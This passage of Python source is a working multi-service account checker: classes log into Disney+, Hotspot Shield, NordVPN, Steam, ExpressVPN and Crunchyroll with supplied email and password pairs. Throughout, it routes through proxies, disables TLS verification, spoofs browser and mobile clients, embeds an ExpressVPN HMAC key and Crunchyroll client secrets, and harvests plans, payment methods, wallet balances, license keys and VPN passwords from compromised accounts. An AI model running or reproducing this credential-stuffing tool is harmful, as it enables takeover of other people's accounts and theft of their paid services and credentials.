                result["status"] = "bad"
                result["message"] = "Wrong password"
            else:
                result["status"] = "error"
                result["message"] = f"Login error: {error_code}"
            return result

        if not user_token:
            result["status"] = "bad"
            result["message"] = "Login failed"
            return result

        account_data = self._fetch_account_details(session, user_token)
        sub_details = self._get_sub_details(session, user_token)

        if sub_details.get("is_active", False):
            result["status"] = "premium"
            result["plan"] = sub_details.get("plan", "Disney+ Premium")
            result["renewal"] = sub_details.get("next_renewal", "")
            result["country"] = country
            if account_data:
                identity = account_data.get("identity", {})
                subs = identity.get("subscriber", {}).get("subscriptions", [])
                if subs:
                    sub = subs[0]
                    result["expiry_date"] = sub.get("term", {}).get("expiryDate", "")[:10]
                    result["partner"] = sub.get("partner", "")
            result["message"] = f"Plan: {result.get('plan')}, Country: {country}, Renewal: {result.get('renewal')}"
        else:
            result["status"] = "free"
            result["message"] = "No active subscription"

        return result

# ----- 4. Hotspot Shield Checker -----
class HotspotShieldChecker:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy

    def check(self, email: str, password: str) -> Dict:
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password)
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ProxyError) as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": f"Network error: {str(e)[:80]}"}
                pass
                continue
        return {"status": "error", "message": "Max retries exceeded"}

    def _check_internal(self, email: str, password: str) -> Dict:
        result = {"status": "error", "email": email, "password": password, "message": ""}
        proxies = None
        if self.proxy:
            proxies = {"http": self.proxy, "https": self.proxy}

        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0',
        ]
        ua = safe_choice(user_agents, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        sess = requests.Session()

        r = sess.post(
            'https://origin.app.hotspotshield.com/api/user/login',
            data=f'login={email}&password={password}',
            headers={
                'User-Agent': ua,
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.5',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://app.hotspotshield.com',
                'Referer': 'https://app.hotspotshield.com/sign-in',
            },
            proxies=proxies,
            timeout=10,
            verify=False
        )
        text = r.text

        if any(k in text for k in ['"status":false', 'LOGIN/PWD INCORRECT', 'INVALID_REQUEST']):
            result["status"] = "bad"
            result["message"] = "Invalid credentials"
            return result
        if '"captcha":true' in text or 'MAX_ATTEMPTS' in text:
            result["status"] = "error"
            result["message"] = "Captcha or rate limit"
            return result
        if '"status":true' not in text:
            result["status"] = "error"
            result["message"] = "Unknown login response"
            return result

        i = sess.get(
            'https://origin.app.hotspotshield.com/api/user/info',
            headers={
                'User-Agent': ua,
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://hotspotshield.aura.com',
                'Referer': 'https://hotspotshield.aura.com/sign-in',
            },
            proxies=proxies,
            timeout=10,
            verify=False
        )
        src = i.text

        def extract(pattern):
            m = re.search(pattern, src)
            return m.group(1) if m else 'N/A'

        plan = extract(r'"plan":"([^"]+)"')
        billing = extract(r'"billingPeriod":"([^"]+)"')
        expiry = extract(r'"activeBefore":"([^"T]+)')
        price = extract(r'"price":"([^"]+)"')
        country = extract(r'"country":"([^"]+)"')
        payment = extract(r'"title":"([^"]+)"')

        days_left = 'N/A'
        if expiry != 'N/A':
            try:
                dt_exp = datetime.strptime(expiry, '%Y-%m-%d')
                days_left = str((dt_exp - datetime.now()).days)
            except:
                pass

        if '"plan":"Basic"' in src:
            result["status"] = "free"
            result["message"] = "Free plan"
        elif '"isExpired":true' in src:
            result["status"] = "expired"
            result["message"] = "Expired subscription"
        else:
            result["status"] = "premium"
            result["message"] = f"Plan: {plan}, Billing: {billing}, Expires: {expiry} ({days_left} days)"
            result.update({
                "plan": plan,
                "billing_period": billing,
                "expiry_date": expiry,
                "days_left": days_left,
                "price": price,
                "country": country,
                "payment_method": payment
            })

        return result

# ----- 5. NordVPN Checker -----
class NordVPNChecker:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy

    def check(self, email: str, password: str) -> Dict:
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password)
            except (curl_requests.errors.ProxyError, curl_requests.errors.Timeout, curl_requests.errors.ConnectionError) as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": f"Network error: {str(e)[:80]}"}
                pass
                continue
        return {"status": "error", "message": "Max retries exceeded"}

    def _check_internal(self, email: str, password: str) -> Dict:
        result = {"status": "error", "email": email, "password": password, "message": ""}
        proxies = None
        if self.proxy:
            proxies = {"http": self.proxy, "https": self.proxy}

        sess = make_session(impersonate="firefox133")
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
        }

        r = sess.get("https://my.nordaccount.com/oauth2/login", headers=headers, proxies=proxies, timeout=12)
        if "Just a moment..." in r.text:
            result["message"] = "Cloudflare challenge"
            return result

        login_url = r.url
        csrf = sess.cookies.get("csrf") or ""

        post_h = headers.copy()
        post_h["Referer"] = login_url
        post_h["Origin"] = "https://nordaccount.com"
        r = sess.post(login_url, headers=post_h, data={"identifier": email, "_csrf": csrf}, proxies=proxies, timeout=12)
        pw_url = r.url
        csrf = sess.cookies.get("csrf") or ""

        post_h["Referer"] = pw_url
        r = sess.post(pw_url, headers=post_h, data={"password": password, "_csrf": csrf},
                      proxies=proxies, timeout=12, allow_redirects=False)

        src = r.text
        loc = r.headers.get("Location", "")

        if "The password you entered is incorrect." in src or r.status_code == 400:
            result["status"] = "bad"
            result["message"] = "Invalid credentials"
            return result

        if "/login/leaked?challenge=" in loc:
            result["status"] = "bad"
            result["message"] = "Leaked password"
            return result

        if "approval_prompt" not in loc:
            result["status"] = "error"
            result["message"] = f"Unexpected redirect: {loc}"
            return result

        url = loc
        for _ in range(4):
            if not url:
                break
            r = sess.get(url, headers=headers, allow_redirects=False, timeout=12)
            url = r.headers.get("Location", "")

        csrf = sess.cookies.get("csrf") or ""

        r = sess.get(
            "https://my.nordaccount.com/api/v1/subscriptions",
            headers={
                "user-agent": headers["Accept"],
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.5",
                "referer": "https://my.nordaccount.com/dashboard/",
                "x-csrf-token": csrf,
            },
            timeout=12
        )
        data = r.json()

        if not data or not isinstance(data, list) or len(data) == 0:
            result["status"] = "free"
            result["message"] = "No active subscription"
            return result

        sub = data[0]
        plans = sub.get("plans", [])
        plan = plans[0].get("display_title", "?") if plans else "?"
        products = sub.get("products", [])
        fi = sub.get("frequency_interval", "")
        fu = sub.get("frequency_unit", "")
        fm = sub.get("frequency_interval_months", "")
        renewable = sub.get("is_renewable", False)
        next_payment = sub.get("next_payment_at", "")
        expiry = next_payment.split("T")[0] if next_payment else "?"

        days = "?"
        if expiry != "?":
            try:
                ed = datetime.strptime(expiry, "%Y-%m-%d").replace(tzinfo=timezone.utc)
                days = (ed - datetime.now(timezone.utc)).days
            except:
                pass

        if isinstance(days, int) and days <= 0:
            result["status"] = "expired"
            result["message"] = f"Expired subscription (plan: {plan})"
        else:
            result["status"] = "premium"
            result["message"] = f"Plan: {plan}, Products: {', '.join(products)}, Type: {fi} {fu} ({fm}m), Renewable: {renewable}, Expiry: {expiry}, Days: {days}"
            result.update({
                "plan": plan,
                "products": ", ".join(products),
                "billing_type": f"{fi} {fu} ({fm}m)",
                "renewable": renewable,
                "expiry_date": expiry,
                "days_left": days
            })

        return result

# ----- 6. Steam Checker (fixed with full network exception handling) -----
class SteamChecker:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy
        self.timeout = 15

    def _varint(self, v):
        if v < 0:
            v &= 0xffffffffffffffff
        buf = bytearray()
        while v > 0x7f:
            buf.append(0x80 | (v & 0x7f))
            v >>= 7
        buf.append(v & 0x7f)
        return bytes(buf)

    def _read_varint(self, data, pos):
        result = shift = 0
        while pos < len(data):
            byte = data[pos]; pos += 1
            result |= (byte & 0x7f) << shift
            if not (byte & 0x80):
                break
            shift += 7
        return result, pos

    def _field_string(self, field, value):
        value = value.encode() if isinstance(value, str) else value
        return self._varint((field << 3) | 2) + self._varint(len(value)) + value

    def _field_bytes(self, field, data):
        return self._varint((field << 3) | 2) + self._varint(len(data)) + data

    def _field_int(self, field, value):
        return self._varint(field << 3) + self._varint(value if value >= 0 else value & 0xffffffffffffffff)

    def _parse_protobuf(self, data):
        result = {}
        pos = 0
        while pos < len(data):
            try:
                tag, pos = self._read_varint(data, pos)
            except:
                break
            field = tag >> 3
            wire = tag & 7
            if field < 1:
                break
            if wire == 0:
                val, pos = self._read_varint(data, pos)
                prev = result.get(field)
                if prev is not None:
                    result[field] = [prev, val] if not isinstance(prev, list) else prev + [val]
                else:
                    result[field] = val
            elif wire == 2:
                length, pos = self._read_varint(data, pos)
                if pos + length > len(data):
                    break
                chunk = data[pos:pos + length]
                pos += length
                prev = result.get(field)
                if prev is not None:
                    result[field] = [prev, chunk] if not isinstance(prev, list) else prev + [chunk]
                else:
                    result[field] = chunk
            elif wire == 5:
                if pos + 4 > len(data):
                    break
                result[field] = struct.unpack_from('<I', data, pos)[0]
                pos += 4
            elif wire == 1:
                if pos + 8 > len(data):
                    break
                result[field] = struct.unpack_from('<Q', data, pos)[0]
                pos += 8
            else:
                break
        return result

    def _rsa_encrypt(self, password, mod_hex, exp_hex):
        mod_bytes = bytes.fromhex(mod_hex)
        n = int.from_bytes(mod_bytes, 'big')
        e = int(exp_hex, 16)
        pw_bytes = password.encode()
        key_len = len(mod_bytes)
        pad_len = key_len - len(pw_bytes) - 3
        pad = bytes(random.randint(1, 255) for _ in range(pad_len))
        block = b'\x00\x02' + pad + b'\x00' + pw_bytes
        m = int.from_bytes(block, 'big')
        c = pow(m, e, n)
        return base64.b64encode(c.to_bytes(key_len, 'big')).decode()

    def check(self, identifier: str, password: str) -> Dict:
        max_retries = 1
        last_exception = None
        for attempt in range(max_retries):
            try:
                return self._check_internal(identifier, password)
            except Exception as e:
                # Only retry on network/connection errors
                if isinstance(e, (
                    requests.exceptions.ConnectionError,
                    requests.exceptions.Timeout,
                    requests.exceptions.ProxyError,
                    requests.exceptions.ChunkedEncodingError,
                    requests.exceptions.StreamConsumedError,
                    requests.exceptions.ContentDecodingError,
                    requests.exceptions.RetryError,
                    requests.exceptions.RequestException,
                    urllib3.exceptions.ProtocolError,
                    urllib3.exceptions.ReadTimeoutError,
                    ConnectionResetError,
                    BrokenPipeError,
                )):
                    last_exception = e
                    if attempt == max_retries - 1:
                        return {
                            "status": "error",
                            "email": identifier,
                            "password": password,
                            "message": f"Network error: {str(e)[:80]}"
                        }
                    pass
                    continue
                else:
                    # Non‑network error – raise immediately
                    raise e
        return {
            "status": "error",
            "email": identifier,
            "password": password,
            "message": f"Max retries exceeded: {last_exception}"
        }

    def _check_internal(self, identifier: str, password: str) -> Dict:
        result = {"status": "error", "email": identifier, "password": password, "message": ""}
        proxies = None
        if self.proxy:
            proxies = {"http": self.proxy, "https": self.proxy}

        sess = requests.Session()
        sess.headers.update({
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip",
            "Connection": "Keep-Alive",
            "User-Agent": "okhttp/4.9.2",
        })

        boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
        multipart_ct = f"multipart/form-data; boundary={boundary}"
        def multipart_field(key, value):
            return (
                f"------{boundary}\r\n"
                f"Content-Disposition: form-data; name=\"{key}\"\r\n\r\n"
                f"{value}\r\n"
                f"------{boundary}--\r\n"
            ).encode()

        # RSA key
        pb = self._field_string(1, identifier)
        enc = urlparse.quote(base64.b64encode(pb).decode())
        r = sess.get(
            f"https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1"
            f"?origin=SteamMobile&input_protobuf_encoded={enc}",
            timeout=self.timeout, proxies=proxies
        )
        if r.status_code != 200:
            result["message"] = f"RSA request failed: {r.status_code}"
            return result
        rsa_data = self._parse_protobuf(r.content)
        mod = rsa_data.get(1, b"").decode()
        exp = rsa_data.get(2, b"").decode()
        timestamp = rsa_data.get(3, 0)
        if not mod or not exp:
            result["message"] = "RSA key empty"
            return result

        enc_pass = self._rsa_encrypt(password, mod, exp)

        # Begin auth
        device = self._field_string(1, "SM-S256B") + self._field_int(2, 3) + self._field_int(3, -500) + self._field_int(4, 1)
        auth_msg = (
            self._field_string(2, identifier) +
            self._field_string(3, enc_pass) +
            self._field_int(4, timestamp) +
            self._field_int(5, 1) +
            self._field_int(7, 1) +
            self._field_string(8, "Mobile") +
            self._field_bytes(9, device) +
            self._field_int(11, 0)
        )
        b64_auth = base64.b64encode(auth_msg).decode()
        r = sess.post(
            "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1",
            data=multipart_field("input_protobuf_encoded", b64_auth),
            headers={"Content-Type": multipart_ct},
            proxies=proxies, timeout=self.timeout
        )
        eresult = int(r.headers.get("X-eresult", "0"))
        if eresult in (5, 2):
            result["status"] = "bad"
            result["message"] = "Invalid credentials"
            return result
        if eresult in (63, 43):
            result["status"] = "bad"
            result["message"] = "Account banned"
            return result
        if eresult != 1:
            result["message"] = f"Auth error: eresult {eresult}"
            return result

        auth_data = self._parse_protobuf(r.content)
        client_id = auth_data.get(1, 0)
        request_id = auth_data.get(2, b"")
        steam_id = auth_data.get(5, 0)

        # Check 2FA
        confs = auth_data.get(4, [])
        if not isinstance(confs, list):
            confs = [confs] if confs else []
        twofa_types = []
        for c in confs:
            if isinstance(c, bytes):
                parsed = self._parse_protobuf(c)
                t = parsed.get(1, 0)
                if isinstance(t, list):
                    twofa_types.extend(t)
                else:
                    twofa_types.append(t)
        if any(t in (2,3,4,5,6) for t in twofa_types):
            result["status"] = "2fa"
            result["message"] = "2FA required"
            return result

        # Poll
        poll = self._field_int(1, client_id) + self._field_bytes(2, request_id)
        poll_b64 = base64.b64encode(poll).decode()
        r = sess.post(
            "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1",
            data=multipart_field("input_protobuf_encoded", poll_b64),
            headers={"Content-Type": multipart_ct, "Accept-Encoding": "identity"},
            proxies=proxies, timeout=self.timeout
        )
        poll_data = self._parse_protobuf(r.content)
        token = poll_data.get(4, b"")
        if isinstance(token, bytes):
            token = token.decode("utf-8", errors="ignore")
        if not token:
            result["message"] = "No token from poll"
            return result

        # Set cookies
        parts = token.split(".")
        if len(parts) < 2:
            result["message"] = "Bad JWT"
            return result
        payload = parts[1]
        rem = len(payload) % 4
        if rem:
            payload += "=" * (4 - rem)
        try:
            jwt = json.loads(base64.urlsafe_b64decode(payload))
        except:
            jwt = {}
        steam_id_str = str(jwt.get("sub", steam_id))
        sess.cookies.set("Steam_Language", "english")
        sess.cookies.set("steamLoginSecure", f"{steam_id_str}%7C%7C{urlparse.quote(token)}")
        sess.cookies.set("mobileClient", "android")
        sess.cookies.set("mobileClientVersion", "777777 3.10.9")

        # Country
        cpb = struct.pack('<BQ', 0x09, int(steam_id_str))
        r = sess.post(
            f"https://api.steampowered.com/IUserAccountService/GetUserCountry/v1"
            f"?access_token={token}&spoof_steamid=",
            data=multipart_field("input_protobuf_encoded", base64.b64encode(cpb).decode()),
            headers={"Content-Type": multipart_ct},
            proxies=proxies, timeout=self.timeout
        )
        cr = self._parse_protobuf(r.content)
        cc = cr.get(1, b"").decode() if cr.get(1) else ""

        # Games
        try:
            gpb = (
                self._field_int(1, int(steam_id_str)) +
                self._field_int(2, 1) +
                self._field_int(3, 1) +
                self._field_int(6, 0) +
                self._field_string(7, "english") +
                self._field_int(8, 1)
            )
            gb64 = urlparse.quote(base64.b64encode(gpb).decode())
            r = sess.get(
                f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v1"
                f"?access_token={token}&spoof_steamid=&origin=SteamMobile"
                f"&input_protobuf_encoded={gb64}",
                proxies=proxies, timeout=self.timeout
            )
            gr = self._parse_protobuf(r.content)
            game_count = gr.get(1, 0)
            raw_games = gr.get(2, [])
            if not isinstance(raw_games, list):
                raw_games = [raw_games] if raw_games else []
            names = []
            for g in raw_games:
                if isinstance(g, bytes):
                    gf = self._parse_protobuf(g)
                    nm = gf.get(2, b"").decode(errors="replace") if gf.get(2) else ""
                    if nm:
                        names.append(nm)
        except:
            game_count = 0
            names = []

        # Level
        level = ""
        try:
            mpid = int(steam_id_str) - 76561197960265728
            r = sess.get(f"https://steamcommunity.com/miniprofile/{mpid}/json", proxies=proxies, timeout=self.timeout)
            if r.status_code == 200:
                try:
                    mpj = r.json()
                    level = str(mpj.get("level", ""))
                except:
                    m = re.search(r'friendPlayerLevel\s+(\S+)', r.text)
                    if m:
                        level = m.group(1)
        except:
            pass

        # Wallet
        balance = ""
        try:
            r = sess.post(
                f"https://api.steampowered.com/IUserAccountService/GetClientWalletDetails/v1"
                f"?access_token={token}&spoof_steamid=",
                data=multipart_field("input_protobuf_encoded", "GAE="),
                headers={"Content-Type": multipart_ct},
                proxies=proxies, timeout=self.timeout
            )
            wr = self._parse_protobuf(r.content)
            bal = wr.get(14, b"")
            if isinstance(bal, bytes):
                balance = bal.decode("utf-8", errors="ignore")
            elif isinstance(bal, int):
                balance = str(bal)
        except:
            pass

        result["status"] = "premium"
        result["steam_id"] = steam_id_str
        result["country"] = cc
        result["level"] = level
        result["games"] = game_count
        result["game_list"] = names
        result["balance"] = balance
        result["message"] = f"SteamID: {steam_id_str}, Country: {cc}, Level: {level}, Games: {game_count}, Wallet: {balance}"
        return result

# ----- 7. ExpressVPN Checker -----
class ExpressVPNChecker:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy
        self.cert_base64 = "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0u+hHAns8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88PocBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxeDjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86EfnKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAdBgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKxXARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1iXJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8krF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNzOuxZ4BXLe7YA=="
        self.hmac_key = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
        self.crypto = AesCryptographyService()

    def _get_session(self):
        session = requests.Session()
        session.headers.update({'User-Agent': 'xvclient/v21.21.0 (ios; 14.4) ui/11.5.2'})
        return session

    def _generate_install_id(self) -> str:
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=64))

    def check(self, email: str, password: str) -> Dict:
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password)
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ProxyError) as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "email": email, "password": password, "message": f"Network error: {str(e)[:80]}"}
                pass
                continue
        return {"status": "error", "email": email, "password": password, "message": "Max retries exceeded"}

    def _check_internal(self, email: str, password: str) -> Dict:
        result = {"status": "error", "email": email, "password": password, "message": ""}
        proxies = None
        if self.proxy:
            proxies = {"http": self.proxy, "https": self.proxy}

        iv = CryptoHelper.get_byte_array(16)
        key = CryptoHelper.get_byte_array(16)
        base64_iv = base64.b64encode(iv).decode('ascii')
        base64_key = base64.b64encode(key).decode('ascii')
        install_id = self._generate_install_id()

        post_data_dict = {"email": email, "iv": base64_iv, "key": base64_key, "password": password}
        post_data = json.dumps(post_data_dict)
        gzipped = CryptoHelper.gzip_data(post_data)
        encrypted_post = CryptoHelper.envelope_encrypt(gzipped, self.cert_base64)

        header_raw = f"POST /apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
        header_signature = CryptoHelper.compute_signature(header_raw.encode('ascii'), self.hmac_key.encode('ascii'))
        post_signature = CryptoHelper.compute_signature(encrypted_post, self.hmac_key.encode('ascii'))

        session = self._get_session()
        url = f"https://www.expressapisv2.net/apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
        headers = {
            'User-Agent': 'xvclient/v21.21.0 (ios; 14.4) ui/11.5.2',
            'Expect': '',
            'Content-Type': 'application/octet-stream',
            'X-Body-Compression': 'gzip',
            'X-Signature': f'2 {header_signature} 91c776e',
            'X-Body-Signature': f'2 {post_signature} 91c776e',
            'Accept-Language': 'en',
            'Accept-Encoding': 'gzip, deflate'
        }
        response = session.post(url, data=encrypted_post, headers=headers, proxies=proxies, timeout=15, verify=False)

        if response.status_code == 401 or response.status_code == 400:
            result["status"] = "bad"
            result["message"] = "Invalid credentials"
            return result
        elif response.status_code == 500:
            result["status"] = "error"
            result["message"] = "Banned/blocked"
            return result
        elif response.status_code != 200:
            result["message"] = f"HTTP {response.status_code}"
            return result

        try:
            decrypted = self.crypto.decrypt(response.content, base64.b64decode(base64_key), base64.b64decode(base64_iv))
            response_body = decrypted.decode('utf-8', errors='ignore')
        except Exception as e:
            result["message"] = f"Decryption failed: {str(e)}"
            return result

        try:
            access_token = re.search(r'"access_token":"([^"]+)"', response_body).group(1)
            ovpn_user = re.search(r'"ovpn_username":"([^"]+)"', response_body).group(1)
            ovpn_pass = re.search(r'"ovpn_password":"([^"]+)"', response_body).group(1)
            pptp_user = re.search(r'"pptp_username":"([^"]+)"', response_body).group(1)
            pptp_pass = re.search(r'"pptp_password":"([^"]+)"', response_body).group(1)
        except:
            result["message"] = "Failed to parse tokens"
            return result

        # subscription
        sub_raw = f"GET /apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"
        sub_signature = CryptoHelper.compute_signature(sub_raw.encode('ascii'), self.hmac_key.encode('ascii'))
        batch_raw = f"POST /apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
        batch_signature = CryptoHelper.compute_signature(batch_raw.encode('ascii'), self.hmac_key.encode('ascii'))
        capture_body = f'[{{"headers":{{"Accept-Language":"en","X-Signature":"2 {sub_signature} 91c776e"}},"method":"GET","url":"/apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"}}]'
        capture_signature = CryptoHelper.compute_signature(capture_body.encode('ascii'), self.hmac_key.encode('ascii'))
        batch_url = f"https://www.expressapisv2.net/apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
        batch_headers = {
            'User-Agent': 'xvclient/v21.21.0 (ios; 14.4) ui/11.5.2',
            'X-Body-Compression': 'gzip',
            'X-Signature': f'2 {batch_signature} 91c776e',
            'X-Body-Signature': f'2 {capture_signature} 91c776e',
            'Accept-Language': 'en',
            'Accept-Encoding': 'gzip, deflate'
        }
        batch_response = session.post(batch_url, data=capture_body, headers=batch_headers, proxies=proxies, timeout=15, verify=False)
        if 'subscription' not in batch_response.text or 'REVOKED' in batch_response.text or 'status\\\":\\\"\\\"' in batch_response.text:
            result["status"] = "expired"
            result["message"] = "Subscription expired or revoked"
            return result

        unescaped = batch_response.text.encode().decode('unicode_escape')
        plan_match = re.search(r'billing_cycle":(\d+)', unescaped)
        plan = f"{plan_match.group(1)} Month" if plan_match else "Unknown"
        auto_renew_match = re.search(r'auto_bill":([^,]+)', unescaped)
        auto_renew = auto_renew_match.group(1) if auto_renew_match else "false"
        exp_match = re.search(r'expiration_time":(\d+)', unescaped)
        expiration = int(exp_match.group(1)) if exp_match else 0
        current_time = int(time.time())
        days_left = round((expiration - current_time) / 86400) if expiration > current_time else 0
        expire_date = datetime.fromtimestamp(expiration).strftime('%Y-%m-%d') if expiration else 'N/A'
        payment_match = re.search(r'payment_method":"([^"]+)"', unescaped)
        payment = payment_match.group(1) if payment_match else "Unknown"

        # license key
        license_code = "N/A"
        web_headers = {
            'Host': 'www.expressvpn.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Referer': 'https://portal.expressvpn.com/my-subscriptions',
            'authorization': f'Bearer {access_token}',
            'content-type': 'application/json',
            'x-tenant': 'xvpn',
            'Origin': 'https://portal.expressvpn.com',
            'Connection': 'keep-alive'
        }
        try:
            web_resp = session.get('https://www.expressvpn.com/api/v2/subscriptions', headers=web_headers, proxies=proxies, timeout=15, verify=False)
            licenses = re.findall(r'longCode":"([^"]+)"', web_resp.text)
            license_code = licenses[-1] if licenses else "N/A"
        except:
            pass

        result["status"] = "premium"
        result["plan"] = plan
        result["auto_renew"] = auto_renew == 'true'
        result["expire_date"] = expire_date
        result["days_left"] = days_left
        result["payment_method"] = payment
        result["license"] = license_code
        result["ovpn_user"] = ovpn_user
        result["ovpn_pass"] = ovpn_pass
        result["pptp_user"] = pptp_user
        result["pptp_pass"] = pptp_pass
        result["message"] = f"Plan: {plan}, Expires: {expire_date} ({days_left} days)"

        return result

# ----- 8. Crunchyroll Checker -----
class CrunchyrollChecker:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy
        self.timeout = 25
        self.max_retry = 3
        self.brn_api = "https://beta-api.crunchyroll.com"
        self.brn_cid = "rjs0ltx0dbwkliwxdzdf"
        self.brn_sec = "4V7rf21-UFXeZ-5XAd0X_QPwr1gu_i1s"
        self.plan_map = {"1": "FAN", "4": "MEGA FAN", "6": "ULTIMATE FAN"}
        self.baron_ua = "Crunchyroll/ANDROIDTV/3.65.0_22347 (Android 10; en-US; sdk_google_atv_x86)"
        self.baro_wua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36"
        self.country_map = {
            "US": "United States", "GB": "United Kingdom", "DE": "Germany", "FR": "France",
            "ES": "Spain", "IT": "Italy", "TR": "Turkey", "BR": "Brazil", "JP": "Japan",
            "KR": "South Korea", "IN": "India", "CA": "Canada", "AU": "Australia", "MX": "Mexico",
            "NL": "Netherlands", "SE": "Sweden", "NO": "Norway", "DK": "Denmark", "FI": "Finland",
            "PL": "Poland", "RU": "Russia", "AR": "Argentina", "CL": "Chile", "CO": "Colombia",
            "PE": "Peru", "AE": "UAE", "SA": "Saudi Arabia", "EG": "Egypt", "ZA": "South Africa",
            "ID": "Indonesia", "MY": "Malaysia", "SG": "Singapore", "TH": "Thailand", "VN": "Vietnam",
            "PH": "Philippines", "KE": "Kenya", "NG": "Nigeria", "GH": "Ghana", "PT": "Portugal",
            "RO": "Romania", "HU": "Hungary", "CZ": "Czech Republic", "UA": "Ukraine",
            "AT": "Austria", "CH": "Switzerland", "BE": "Belgium", "IL": "Israel", "TW": "Taiwan",
            "HK": "Hong Kong", "PK": "Pakistan", "NZ": "New Zealand", "SK": "Slovakia",
            "HR": "Croatia", "RS": "Serbia", "BG": "Bulgaria",
        }

    def _proxy_url(self, proxy_str):
        if not proxy_str:
            return None
        p = proxy_str.strip()
        if '://' in p:
            return p
        parts = p.split(':')
        if len(parts) == 4:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        if len(parts) == 2:
            return f"http://{parts[0]}:{parts[1]}"
        return f"http://{p}"

    def _session(self, proxy_str=None):
        sess = requests.Session()
        pu = self._proxy_url(proxy_str)
        if pu:
            sess.proxies = {'http': pu, 'https': pu}
        return sess

    def check(self, email: str, password: str) -> Dict:
        result = {"status": "error", "email": email, "password": password, "message": ""}
        proxy_str = self.proxy if self.proxy else None

